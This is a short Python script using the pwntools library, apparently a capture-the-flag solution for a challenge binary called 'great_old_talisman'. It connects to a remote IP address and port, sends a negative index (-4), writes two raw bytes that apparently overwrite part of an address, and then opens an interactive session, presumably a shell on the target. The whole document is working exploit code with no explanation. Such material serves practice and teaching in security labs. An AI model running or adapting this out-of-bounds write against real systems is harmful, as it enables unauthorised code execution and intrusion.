from pwn import *

io = remote("94.237.54.138", 41930)
#io = process("./great_old_talisman")

io.sendlineafter(">> ", str(-4).encode())
io.sendafter(": ", b"\x5e\x13")
io.interactive()
